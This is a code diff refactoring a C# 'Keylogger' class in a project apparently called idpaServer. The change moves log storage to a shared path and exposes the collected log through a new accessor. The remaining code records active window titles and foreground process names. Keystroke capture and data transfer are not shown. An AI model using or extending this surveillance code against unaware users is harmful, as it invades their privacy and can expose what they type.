@@ -13,8 +13,6 @@ namespace idpaServer
    
     static class Keylogger
     {
-        static private string LOG_PATH = Controller.APP_PATH + @"\log.xml"; //Where the logfile will be stored
-
         static private string activeWindow;
         static private IdpaTools.Logger logger;
 
@@ -38,22 +36,15 @@ namespace idpaServer
         {
             logger = new IdpaTools.Logger();
             activeWindow = "";
-            logger = Serilizer.getDataFromFile(LOG_PATH, logger);
+            logger = IdpaTools.Serilizer.getDataFromFile(Controller.LOG_PATH, logger);
         }
 
-        static void CreateLog(string file)
+        public static Logger GetLogger()
         {
-            try
-            {
-                Serilizer.writeDataToFile(LOG_PATH, logger);
-                Console.WriteLine("Log Created");
-            }
-            catch
-            {
-            }
+            return logger;
         }
 
-        static public void KeyTick(object sender, EventArgs e)
+        public static void KeyTick(object sender, EventArgs e)
         {
             if (activeWindow != GetActiveWindowTitle() && GetActiveWindowTitle() != null)
             {
@@ -74,12 +65,7 @@ namespace idpaServer
             }
         }
 
-        static public void LogTick(object sender, EventArgs e)
-        {
-            CreateLog(LOG_PATH);
-        }
-
-        static private string GetActiveWindowTitle()
+        private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
             StringBuilder Buff = new StringBuilder(nChars);
@@ -92,7 +78,7 @@ namespace idpaServer
             return null;
         }
 
-        static string GetActiveProcessFileName()
+        private static string GetActiveProcessFileName()
         {
             IntPtr hwnd = GetForegroundWindow();
             uint pid;
